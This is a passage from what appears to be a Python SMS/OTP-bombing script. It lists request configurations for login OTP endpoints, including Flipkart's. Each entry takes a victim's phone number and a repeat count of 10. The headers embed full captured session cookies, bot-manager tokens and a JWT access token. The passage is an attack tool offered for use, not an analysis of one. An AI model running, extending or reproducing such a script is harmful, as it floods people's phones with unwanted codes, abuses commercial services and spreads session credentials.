bm_sc=1~2~830424983~YAAQVvEBF60sgaGcAQAAM9s7yQeJKaZ84G1d8dfdSFQtMtO57SttJYtYTapmkj2yZKFsrNjccp72mTOUVX6G26xPmYKdNkYYq1eLilbsnMmtqaJ+k14Wg0fLF8glv39F+NEjvN2YRtKtcibQ4N4Ctwxfg/Yfk4vLpoioz9nlR1E+j5NBXyYlkCZC0nS5YbAara4LnFJwOS+Q5Et+LYBz64GJ7IV+uz0mw1SGlAwvKoUe9vRJOsuDctWHwx62T9ujMFzgcEQ0Tis37b96XEAGdIRceqHusg864ZhYDZNBfqPvp/3pjvPXPCJ91tP2Qv6jdj2DGkiAsC/IApRqpD1U2FN2gq4bD/8yyQgKdOcqZsckJxI5OTCJaa1FLLJQ+xq+gJFCK7U60hTkLSmCArZ06pq/QflIB0C37gcvBpzGo9ZsE5PCNLkPp4kupw6MKCJDnZipa6XVx4gvOoxjp2XOq7v7EUWjO14xrIDbR/AT7ZnVF6EmIkCjxPV7RfX8MoX7hhGjCYzfwwtrAthwuTawv02H+SpudnO3zI/FLTpcwOsli99SkphqC8X0hs+fA0nEoqS569YK8QNCmX0O1oRYCZVAkKURSbHsSimqo0Mhyt90AWMycqtR4rvnBK9yyYLevEZyeQSoXalAaufBC1hiWRUdwZt7Raoe/C3JpB1+xECMTBg3QkUPe8pvOvX/UgHp7sSfnpOKxPUAyispqedGvVqPZtTH8yHmRpi8oVl/gcIZBQRGtz8jy2JhbgsaCmMNWSONnfBsSlqrUi9spoZbG3TGHrKROtqgmJhSpzmm3Mozee14hMIuP4qNgmXdJZ+0Yj6rw4Kopxxn2mzGe1gC2gpt7CHc/Q3IM0GMdbqcKIvAys7if4RBsrrWd7OKhqsI8cUkIKOsPpASUuR84tSUgxpO2zpZy9t+bMncRyicX0gkh/PsZf+8LDqeJefvI71RtQ4iXmJGzH9zE4enguMcwaH26AYx5/TqOoRTCo1GGa76nWx/jaZWUWk1XVDonA==~0~0~0; bm_so=A72D7F1F93E29397C6F2CCBCE39A2FB6B4AF2CC875E40D0FB0EE78F19116AD6F~YAAQVvEBF64sgaGcAQAAM9s7yQa1ZjEX9iHTlUHKNynziGLaOQ7GXClASdm/vdA+8PNlLKE189q6jxoxneWRXw3bRWFeT54gQWDNbyX6Ldd5k/7ek9aiKsASIYVCYu0B5NgP/ZzfPS47CSIa1IklCfKnkN9QBd5UupaOi7plb2NTuKhyQTMXdIhwPQmkdYPBs0GmbKpNdiPcrrEGoFE9sXOkvjId7KFpOBAlWNWKhMPO00xE2j85+7FQVSVuaPmpcpEtrl7FkpGdH3TDfKYFJG/xeJbnYE/UfufgiSgIyUcXWSb89pFIXDuTTlpo4KENQPj6lypB5TLfd24n4gSDIn6JNBnDqTELpB9Ilm0TscUQorDnBcTgDU1m97r+Dq01sV/CbHYGyYj7Ov1JUNRZ8lLSWR0dec+uAykibaxytGvqokDRpWG3rhplaXWKLQK1J0AGbqN4V74v3Ayud9Oj9g==; _gcl_au=1.1.2086636345.1772902668; _ga=GA1.1.515868074.1772902669; _ga_NEH2MEG9CT=GS2.1.s1772902668$o1$g0$t1772902668$j60$l0$h0; _abck=45CE841CC60EFF48D040C1007EF4016F~0~YAAQVvEBF43MgaGcAQAAlGJCyQ/DNbrSGSW/mvMYSqvpznJGIDx2fDpb22GUTF2ZtZV1Q003J0uDHcr6fw2o4noNzo7XDfRS/tKsvDjrKh24onRBsZNrPnaBGae6zudkHAiaJZUD+a8rl1Ctscr+sRdGuv5CwJ1dqELldzLRajuTIeVBcSuGRyhJZ1OWfpv0FM19Fe/pT/E5+eWGTpppMibgOYw5op1/xRTJyGOtrB85VZ84Pwtir3PrePDBSUK+icDD05sI0jdLlOPHk9KEFNmkIfnhDLxqXdhrjM3yxobRIxsyffDTr6FMqC8mxweFxCwm/5ZFKS8uYNyjIrjqzeiesSLIOK0D/k2wZg6JA/ZRs0YTROStqUYMlWZ/BfD2On0Sz9/6u78lRCFK7hEgnahLa44X00Sqo+guRBVMPldeUyAnEzbHjGqnbCo3SvWI30FZMBjsq9HxZhzPdEuC4489ROoWrAPQ8Ytebc6tw98Ej0zwuKrUW/8q8sUIoowTHjsE86YSflv+rZTayjKYiAkSl9REdfkMReLpVOYUqFEOeMoy3iPI+nvq1U5mlkpd2RCMX1YaqMW4oy9hRntGd9N98WUKMUFI1mM+OQMF8/IsDBSTdvqRUsMw1tU=~-1~-1~-1~AAQAAAAF%2f%2f%2f%2f%2f2ATXZJ%2fKeLz+ZDfvfKH0CAxoURbzs%2fp7jazIXyPMJrYhvfH3dm3T4BP4rD57s2ONvIHn3TvML56I+8eP7qkeOOo1PunUxQLTn6K~-1; bm_sv=2505E8FD9F28907978AD8D078874CAE6~YAAQVvEBF1HOgaGcAQAAC3VCyR+cbDNOMmXTs/0oJAltz/MZDPJ5kVmmDvYNSbKGNlA+Uw7JSyn+qPK/5Ebh1098gJM2X8580ZNektsZXIud07k7f3pkN7YPsWXip4quxUMCuCGTsGX4GR1itrm6BccwhliFImoBOShYINwuvf4oSpF4Jbh8KCmhaJCMXJw0f++gPbJs+i6mUyQjwTG9LajfCbOHTUPqmRaMC2DD2IAa+afiw4gb3t7fBgt45EfB~1; mp_60483c180bee99d71ee5c084d7bb9d20_mixpanel=%7B%22distinct_id%22%3A%20%2219cc93bd3378cc-0e1dad93bf187d-26061c51-100200-19cc93bd338e0c%22%2C%22%24device_id%22%3A%20%2219cc93bd3378cc-0e1dad93bf187d-26061c51-100200-19cc93bd338e0c%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%2C%22%24user_id%22%3A%20%2219cc93bd3378cc-0e1dad93bf187d-26061c51-100200-19cc93bd338e0c%22%2C%22Is%20Anonymous%22%3A%20%22True%22%2C%22Session%20ID%22%3A%20%2224e2050c-fc17-4b30-9dd3-aa805003%22%2C%22last%20event%20time%22%3A%201772903108183%7D'
        },
        "data": lambda phone: json.dumps({"phone_number": phone}),
        "count": 10
    },

    {
        "url": "https://2.rome.api.flipkart.com/api/7/user/otp/generate",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "content-type": "application/json",
            "origin": "https://www.flipkart.com",
            "referer": "https://www.flipkart.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
            "x-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop",
            "cookie": 'T=TI177290339726700141648828544780756239045278746568283339940249132058; K-ACTION=null; vh=651; vw=1366; dpr=1; at=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjFkOTYzYzUwLTM0YjctNDA1OC1iMTNmLWY2NDhiODFjYTBkYSJ9.eyJleHAiOjE3NzQ2MzE0MDMsImlhdCI6MTc3MjkwMzQwMywiaXNzIjoia2V2bGFyIiwianRpIjoiZWNjMzI1YTQtZWJjNy00YTZhLThiZDItYTBhZjg0YTMyOWQ4IiwidHlwZSI6IkFUIiwiZElkIjoiVEkxNzcyOTAzMzk3MjY3MDAxNDE2NDg4Mjg1NDQ3ODA3NTYyMzkwNDUyNzg3NDY1NjgyODMzMzk5NDAyNDkxMzIwNTgiLCJrZXZJZCI6IlZJMUQxQUM2MUNCNkIzNEEwMUI5MzExODBDQjk0MThCNTkiLCJ0SWQiOiJtYXBpIiwidnMiOiJMTyIsInoiOiJIWUQiLCJtIjp0cnVlLCJnZW4iOjR9.lg00_VMt-wyUxdgZXJj3cYzUl1bnMNUyMxtUarR3vzU; rt=null; ud=8.H-ln8QiRdJI2Sd_6H6Ww6mCGs5k2lJvvabgQRdssG5321-ouTQpXVTW2mrutYyTqIrOy6X9zTCAaFhCdoTqh6bfz-Q8aN3578vb8IX8wm5GXKkYCWZhue6NifrIuka-n0xjVugA7qoyY-PGikqMDOA; vd=VI1D1AC61CB6B34A01B931180CB9418B59-1772903403767-1.1772903403.1772903403.152180447; AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg=1; AMCV_17EB401053DAF4840A490D4C%40AdobeOrg=-227196251%7CMCIDTS%7C20520%7CMCMID%7C68774367905168361941505182743488131767%7CMCAAMLH-1773508202%7C12%7CMCAAMB-1773508202%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1772910603s%7CNONE%7CMCAID%7CNONE; s_sq=flipkart-prd%3D%2526pid%253Dwww.flipkart.com%25253Aaccount%25253Alogin%2526pidt%253D1%2526oid%253DfunctionJr%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT; S=d1t19Pzs/Pz80Pz8kTQA/fDs/LCGVPfzcLLxzlYRIa6s7Msy5cUg2CCoM7rcZu3KQN85/f9pp6BAfBzV2ETy9rKSwdw==; SN=VI1D1AC61CB6B34A01B931180CB9418B59.TOK72809282932941B3A25E30A53E6BDBAB.1772903418825.LO'
        },
        "data": lambda phone: json.dumps({"loginId": f"+91{phone}"}),
        "count": 10
    },
]
# =============== ALL APIs END ===============
